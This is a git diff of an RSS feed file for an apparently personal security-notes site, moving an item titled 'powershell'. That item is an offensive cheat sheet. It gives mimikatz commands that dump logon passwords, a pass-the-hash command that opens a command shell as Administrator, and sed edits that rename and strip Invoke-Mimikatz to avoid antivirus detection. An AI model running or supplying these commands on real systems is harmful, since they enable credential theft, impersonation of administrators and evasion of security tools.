@@ -74,6 +74,22 @@ https://nostarch.com/packetanalysis3</description>
     </item>
     
     <item>
+      <title>powershell</title>
+      <link>https://blackvolga.github.io/intel/powershell/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <author>blackvolga@pm.me (GAZ23)</author>
+      <guid>https://blackvolga.github.io/intel/powershell/</guid>
+      <description>https://github.com/gentilkiwi/mimikatz
+https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
+TLDR:
+1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
+extract passwds
+1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
+1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
+1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &amp;#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&amp;#39; Invoke-MimiDawgz.ps1 4sed -i -e &amp;#39;/&amp;lt;#/,/#&amp;gt;/c\\&amp;#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &amp;#39;s/^[[:space:]]*#.*$//g&amp;#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &amp;#39;s/DumpCreds/DumpCred/g&amp;#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &amp;#39;s/ArgumentPtr/NotTodayPal/g&amp;#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &amp;#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&amp;#39; 13Invoke-MimiDawgz.</description>
+    </item>
+    
+    <item>
       <title>Random</title>
       <link>https://blackvolga.github.io/intel/random/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -119,22 +135,6 @@ Misc
  https://github.com/qazbnm456/awesome-web-security
  https://github.com/sneakerhax/Runbooks
   </description>
-    </item>
-    
-    <item>
-      <title>powershell</title>
-      <link>https://blackvolga.github.io/intel/powershell/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      <author>blackvolga@pm.me (GAZ23)</author>
-      <guid>https://blackvolga.github.io/intel/powershell/</guid>
-      <description>https://github.com/gentilkiwi/mimikatz
-https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
-TLDR:
-1.\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit
-extract passwds
-1mimikatz_command -f sekurlsa::logonPasswords full 2mimikatz_command -f sekurlsa::wdigest pass the hash (on the left hand side)
-1sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe mimidawgz (avoid AV detection)
-1mv Invoke-Mimikatz.ps1 Invoke-MimiDawgz.ps1 2 3sed -i -e &amp;#39;s/Invoke-Mimikatz/Invoke-Mimidawgz/g&amp;#39; Invoke-MimiDawgz.ps1 4sed -i -e &amp;#39;/&amp;lt;#/,/#&amp;gt;/c\\&amp;#39; Invoke-MimiDawgz.ps1 5 6sed -i -e &amp;#39;s/^[[:space:]]*#.*$//g&amp;#39; Invoke-MimiDawgz.ps1 7 8sed -i -e &amp;#39;s/DumpCreds/DumpCred/g&amp;#39; Invoke-MimiDawgz.ps1 9 10sed -i -e &amp;#39;s/ArgumentPtr/NotTodayPal/g&amp;#39; Invoke-MimiDawgz.ps1 11 12sed -i -e &amp;#39;s/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g&amp;#39; 13Invoke-MimiDawgz.</description>
     </item>
     
   </channel>
